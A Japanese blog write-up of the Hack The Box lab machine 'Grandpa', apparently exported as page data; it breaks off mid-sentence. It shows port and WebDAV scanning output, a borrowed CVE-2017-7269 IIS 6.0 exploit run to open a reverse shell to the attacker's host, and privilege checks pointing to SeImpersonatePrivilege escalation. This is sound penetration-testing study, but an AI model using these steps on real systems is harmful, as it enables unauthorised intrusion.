{"componentChunkName":"component---src-templates-post-template-js","path":"/hackthebox-windows-grandpa","result":{"data":{"markdownRemark":{"id":"1fe9c568-55ce-5cdf-b6cc-c156dce16d74","html":"<p>「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。\n「Hack The Box」のランクは、本記事執筆時点でProHackerです。</p>\n<span class=\"gatsby-resp-image-wrapper\" style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 220px; \">\n      <a class=\"gatsby-resp-image-link\" href=\"/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png\" style=\"display: block\" target=\"_blank\" rel=\"noopener\">\n    <span class=\"gatsby-resp-image-background-image\" style=\"padding-bottom: 22.727272727272727%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQY0x2PTW8SURiF51+4d6MbTcuAhbnzcYeZAQb5aJiGaR0+RALRSKCh1lTa0tq6c6WLpqumSxO3bvwJ/qn7eGFxcnLenDw5r3G9OuHL6VxdrRZ0D1PqnZRGkrKfZiRvBmSjib51scMaftxkzwu1t3SOcaK6VkzBKWMKqbQwfj9eqj+/vvPv7wNf10tGH+Ycfz5jOlswW55ytr6mP57i19sk2WAL7xz1GIwnpP0R2bspRRltgOTtQBnrmxY/fq7U/d0t39afaHXf6lXvkdU2btjSsI/4UZN8O8OMOuzKBk5Y5mRoY0uPKHTZKfmYlqN2iiZGO32qxrOYi/Mh49EBQeLSOAqpHHjUDgXNXplg38OqSMJEQ2KPvCgjpK9f9dlzpV4XsGuZhN0nyniRe6YLz5UrX+mCg6gKRM1CVGzcusCJLeyaTSlwcF8L7S45yycn9KqtNq/qXHLUy4LJf3H/wNmxBWKzAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"></span>\n  <picture>\n          <source srcset=\"/static/598fc82bb08f81fbaaa4aab930820dd3/b5458/327080.webp 220w\" sizes=\"(max-width: 220px) 100vw, 220px\" type=\"image/webp\">\n          <source srcset=\"/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png 220w\" sizes=\"(max-width: 220px) 100vw, 220px\" type=\"image/png\">\n          <img class=\"gatsby-resp-image-image\" src=\"/static/598fc82bb08f81fbaaa4aab930820dd3/c8042/327080.png\" alt=\"Hack The Box\" title=\"Hack The Box\" loading=\"lazy\" style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\">\n        </picture>\n  </a>\n    </span>\n<p>今回は、HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。</p>\n<!-- omit in toc -->\n<h2 id=\"本記事について\" style=\"position:relative;\"><a href=\"#%E6%9C%AC%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\" aria-label=\"本記事について permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>本記事について</h2>\n<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>\n<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>\n<p>またすべての発言は所属団体ではなく個人に帰属します。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li>\n<p><a href=\"#%E6%8E%A2%E7%B4%A2\">探索</a></p>\n<ul>\n<li><a href=\"#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">ポートスキャン</a></li>\n<li><a href=\"#wevdav%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">WevDAVのスキャン</a></li>\n<li><a href=\"#%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88\">エクスプロイト</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2\">内部探索</a></li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n</ul>\n<h2 id=\"探索\" style=\"position:relative;\"><a href=\"#%E6%8E%A2%E7%B4%A2\" aria-label=\"探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>探索</h2>\n<h3 id=\"ポートスキャン\" style=\"position:relative;\"><a href=\"#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"ポートスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ポートスキャン</h3>\n<p>とりあえずNmapを叩いていきます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ nmap -sV -sC -T4 <span class=\"token variable\">$RHOST</span><span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap1.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Microsoft IIS httpd <span class=\"token number\">6.0</span>\n<span class=\"token operator\">|</span> http-methods: \n<span class=\"token operator\">|</span>_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH\n<span class=\"token operator\">|</span>_http-title: Under Construction\n<span class=\"token operator\">|</span> http-webdav-scan: \n<span class=\"token operator\">|</span>   Server Date: Sat, 04 Jun <span class=\"token number\">2022</span> 01:01:45 GMT\n<span class=\"token operator\">|</span>   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\n<span class=\"token operator\">|</span>   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n<span class=\"token operator\">|</span>   WebDAV type: Unknown\n<span class=\"token operator\">|</span>_  Server Type: Microsoft-IIS/6.0\n<span class=\"token operator\">|</span>_http-server-header: Microsoft-IIS/6.0\nService Info: OS: Windows<span class=\"token punctuation\">;</span> CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"token builtin class-name\">.</span>\nNmap done: <span class=\"token number\">1</span> IP address <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token function\">host</span> up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">28.16</span> seconds</code></pre></div>\n<p>IISが稼働しているようなのでアクセスしてみました。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 612px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABgUlEQVQoz42T626CQBCFff9Hsz+tqWkTsVhgFxYWEAhyOz2zXqJFG0mGnSXwzZzZwyIIDqiqBjbLkOe5izRNUZYlXrmmabrbL9brmoASh4PEwYGKonB527Y4Ho9omprRoK5rF6e8wTAMM+ii647uoyiKoLVGEATwfZ+xx56r5+1gTIqGICkixaqqYl6h7/s5UG5d18H/3hEaYr/3sdt5hCSUb5Ek2o0gLyyy1JwVyGiyK2gG7PuBgNxJTxJCmLftAGmAtahgOsfIPVdG246U/AQos9DaIo5zRCqDilJKVvj5iRkaYWjYfcpxJFSg3XNjSpxGOD0C9uwqJlA5mUqF7FT2moUU8wRZZmBtRhWSpxjH2/k96NBa6w6leNEud1JvnLO4JCOhSkXYfHxgu/UoM8Tn1xe2nuesIv6UExbLXGDTZf0r+XLSYpP39Rqr1YrQLTabDZbLN1egplXkhMWbeACadziOqOgzsUgcx252shpjrl09+ztmwP9euIXcdvWsw18GHqISN7Sz5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b2533fe676689a33affdb40498991d33/8ac56/image-20220604100328237.webp 240w,\n/static/b2533fe676689a33affdb40498991d33/d3be9/image-20220604100328237.webp 480w,\n/static/b2533fe676689a33affdb40498991d33/d1d8c/image-20220604100328237.webp 612w\"\n              sizes=\"(max-width: 612px) 100vw, 612px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b2533fe676689a33affdb40498991d33/8ff5a/image-20220604100328237.png 240w,\n/static/b2533fe676689a33affdb40498991d33/e85cb/image-20220604100328237.png 480w,\n/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png 612w\"\n            sizes=\"(max-width: 612px) 100vw, 612px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b2533fe676689a33affdb40498991d33/8c76f/image-20220604100328237.png\"\n            alt=\"image-20220604100328237\"\n            title=\"image-20220604100328237\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>あまり情報が取れなかったのでgobusterで探索します。</p>\n<p>いくつかのパスが見つかりました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$RHOST</span>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t <span class=\"token number\">40</span> <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> gobuster1.txt\n\n/images               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">152</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://<span class=\"token variable\">$RHOST</span>/images/<span class=\"token punctuation\">]</span>\n/Images               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">152</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://<span class=\"token variable\">$RHOST</span>/Images/<span class=\"token punctuation\">]</span>\n/IMAGES               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">152</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://<span class=\"token variable\">$RHOST</span>/IMAGES/<span class=\"token punctuation\">]</span> \n/_private             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">403</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">1529</span><span class=\"token punctuation\">]</span> </code></pre></div>\n<ul>\n<li>Images</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 417px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB3klEQVQoz62PTWsaURSG78JFXdmdsXYyilFj1WzSRlEhFuLG/k43goo6jqVQoVHbGmiS0lWzMInfM3e0fiSCKL49c0XoD+iFh/Pxvufce5nlBcOrY4YDuwOS9BoOhwMulwybzSZySZJgt9thsVhgtVrBGCPtpeibOJ1OyLJMMy6RM0mihtuJw0MZbrcbHo+HOILX6xX4/X6B2T+i2ow+nw+BQEBgama9h52ETxA4fiNuCAaDCIdDOD19i2TyPWKxOGLxOKLRKCKRCNLpD0QaF6kLpFIpJBIJnJ8ncXb2DqFQiGbDYNlsFvl8HuVyGaVSSVCpVETMFwoiVxQF1epHqKqKXC4notk3KRaLKJBvD2s2G8hkMrhqfcdlvY56vYH65Rc8drq4ub5GrVaDUlGhKkU0vn5DpVxCo9lEuVhA9dNntFot/HsY5xztdhuDfh+9Xh+dbhcP923o3MBee+x08OvnLX7c3GI4HKJP3ru732jfP0DXdbFos9kI2Hw+w3yxwHQ6xWw+x2QyofzPriYWpC2XS1E/Pz2J2vQsl89ibjabYTAYYr1e7144GY+h6VzcNBqNSBxQHELTNOiEpukwDINe1cOYvJx8podznX7BwQ1O2gCr1Wq3EP/xbLdb/AWUowg/ebX4FgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0b73291b0d4076d3a6914778a9962a12/8ac56/image-20220604100519971.webp 240w,\n/static/0b73291b0d4076d3a6914778a9962a12/b6b2f/image-20220604100519971.webp 417w\"\n              sizes=\"(max-width: 417px) 100vw, 417px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0b73291b0d4076d3a6914778a9962a12/8ff5a/image-20220604100519971.png 240w,\n/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png 417w\"\n            sizes=\"(max-width: 417px) 100vw, 417px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0b73291b0d4076d3a6914778a9962a12/f27fb/image-20220604100519971.png\"\n            alt=\"image-20220604100519971\"\n            title=\"image-20220604100519971\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<ul>\n<li>_private</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 697px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACxUlEQVQ4y5VU204TURTtNxguYiQGQqLRqDwgvhBexBeJSIzRb9OooUIo0Co/IQkBlCANlMt02k6nt+l0pp1OL9OW5d57KmkN8XKSlb3P7jlr1r6cBq4NjODJ3DwWXrzGs/mXeL7wSvzFxTd4OPkYg8OjGBi62Ychig2P3LoSgfsPHmFqagYzM3OYnX2K6elZAccmbk9ibPweJu5M9mF07C4Gro9h8MY4Bkf6EQiHN7Gx8Rnh8BdEIptYX49gbS2CUCiMTytrWCas0n55dR3B5RCCKyF8XFrB2/dLePchSFjqIigIgJbnNdFqeWi3W2RbXb8Nr9lEo1EX/OsK2LaFbDaLdDoNXc8I0rqOfD4v8VQqRdBQNE005QMN1Ot11Gp1uK4rPlvP88UIoaLE5eK5oiAeV6CqCZyenpIfp98UsbFYDLHjGJ05l5iqqnKOz/NdzkgUWlZJ1HEwkUyKnySbSCTEJsnyZSZlqLQ3Sa3jOKhWq6hUKgRH1AthrVZDsViUA+VyWQ5zGv+7Op2OT3hxcYEa1SCT0aGROk3TUCgYYOWGYcjHbNuGbVnkmyiV/DhbBp9lIbyYK8DMnuchl8sSaUYus2pOh4vtOJWudbrF9yS9XnDsktAkBVwbTaNuJlPS2bjiN4brKbUicCmY8E9LCDndglGQ1PKFgsCk9AwiYFvhwhNhk8aClfDY/A6ueU9TXJq5HHI0d0VSZxIs9jNZGKQwR903aDYbVVcU/ipFL+pEyuqEUKRSHXlw88fHqNC8uZSyS2VAySKUBB2zKEptu3xJ7Dj+2LjkX6bMDsvlOTyMRvF9fx+HR0cy5Do1KUF1TetpZHN5mU2N55UtTQODXxaT9inkJxONHuLHwQFOTmLY3t7GPhFvbW1hd2cHe3u7hG+0/4qzszP5uD/8qjxRnpT+lGnDpFxg/pGfUS845v9ptP7a5Z+P7J/rvFuGMgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a7e2839977c2fd3b80b3dae70703437a/8ac56/image-20220604101247760.webp 240w,\n/static/a7e2839977c2fd3b80b3dae70703437a/d3be9/image-20220604101247760.webp 480w,\n/static/a7e2839977c2fd3b80b3dae70703437a/458b7/image-20220604101247760.webp 697w\"\n              sizes=\"(max-width: 697px) 100vw, 697px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a7e2839977c2fd3b80b3dae70703437a/8ff5a/image-20220604101247760.png 240w,\n/static/a7e2839977c2fd3b80b3dae70703437a/e85cb/image-20220604101247760.png 480w,\n/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png 697w\"\n            sizes=\"(max-width: 697px) 100vw, 697px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a7e2839977c2fd3b80b3dae70703437a/7422e/image-20220604101247760.png\"\n            alt=\"image-20220604101247760\"\n            title=\"image-20220604101247760\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>これだけだと攻略の手掛かりにはならなさそうです。</p>\n<p>feroxbusterも試してみましたが、特に有益な情報はありませんでした。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ feroxbuster -u http://<span class=\"token variable\">$RHOST</span>/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> feroxbuster.txt</code></pre></div>\n<h3 id=\"wevdavのスキャン\" style=\"position:relative;\"><a href=\"#wevdav%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"wevdavのスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WevDAVのスキャン</h3>\n<p>続いて、<code class=\"language-text\">davtest</code>を使ってWevDAVの確認を行います。</p>\n<p>WevDAVはざっくり言うとHTTPベースのファイル転送機構です。</p>\n<p>DAVTestを使うことで、WevDAVが稼働しているかをチェックすることができます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ /usr/bin/davtest -url http://<span class=\"token variable\">$RHOST</span>/\n********************************************************\n Testing DAV connection\nOPEN            SUCCEED:                http://<span class=\"token variable\">$RHOST</span>\n********************************************************\nNOTE    Random string <span class=\"token keyword\">for</span> this session: raQC3An4\n********************************************************\n Creating directory\nMKCOL           FAIL\n********************************************************\n Sending <span class=\"token builtin class-name\">test</span> files\nPUT     jhtml   FAIL\nPUT     cfm     FAIL\nPUT     cgi     FAIL\nPUT     jsp     FAIL\nPUT     txt     FAIL\nPUT     pl      FAIL\nPUT     php     FAIL\nPUT     shtml   FAIL\nPUT     asp     FAIL\nPUT     html    FAIL\nPUT     aspx    FAIL\n\n********************************************************</code></pre></div>\n<p>参考：<a href=\"https://whitemarkn.com/learning-ethical-hacker/davtest/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ハッカーはDAVTestでWebDAVが有効なサーバーをテストする(Kali Linux) | AIを武器にホワイトハッカーになる</a></p>\n<p>参考：<a href=\"https://nmap.org/nsedoc/scripts/http-webdav-scan.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http-webdav-scan NSE script — Nmap Scripting Engine documentation</a></p>\n<p>Nmapの<code class=\"language-text\">http-webdav-scan</code>の結果からいくつかのメソッドが裕子になっていることを確認していたのですが、残念ながらそのまま使用することはできなさそうでした。</p>\n<h3 id=\"エクスプロイト\" style=\"position:relative;\"><a href=\"#%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88\" aria-label=\"エクスプロイト permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>エクスプロイト</h3>\n<p>しかし、どうやらIIS 6.0のWevDAVには認証をバイパス可能な脆弱性があるようですので、これを利用して任意のコード実行ができそうです。</p>\n<p>参考：<a href=\"https://www.exploit-db.com/exploits/41738\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow - Windows remote Exploit</a></p>\n<p>今回は以下のエクスプロイトコードを拝借しました。</p>\n<p>参考：<a href=\"https://gist.github.com/g0rx/693a89197e0b9d1464cab536fdc9f933\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">iis6-exploit-2017-CVE-2017-7269</a></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">root@pentestlab:~<span class=\"token comment\"># python revshell.py </span>\nusage:iis6webdav.py targetip targetport reverseip reverseport\n\nroot@pentestlab:~<span class=\"token comment\"># python revshell.py 10.10.10.14 80 10.10.14.2 9999</span></code></pre></div>\n<p>これでリバースシェルが取得できました。</p>\n<p>しかし、非常に残念なことに今回取得できたシェルではuserフラグの取得はできないようでした。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">whoami</span>\nnt authority<span class=\"token punctuation\">\\</span>network <span class=\"token function\">service</span></code></pre></div>\n<p>というわけで権限昇格を目指していきます。</p>\n<h2 id=\"内部探索\" style=\"position:relative;\"><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2\" aria-label=\"内部探索 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>内部探索</h2>\n<p>とりあえずいつも通りユーザの権限を確認してみます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">whoami</span> /pri\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State   \n<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\nSeAuditPrivilege              Generate security audits                  Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas <span class=\"token keyword\">for</span> a process        Disabled\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled </code></pre></div>\n<p><code class=\"language-text\">SeImpersonatePrivilege</code>が有効なようです！</p>\n<p><code class=\"language-text\">SeImpersonatePrivilege</code>とは、サーバがクライアントの権限になりすますことを許可する権限です。</p>\n<p>この権限が有効な場合、<code class=\"language-text\">Named Pipe 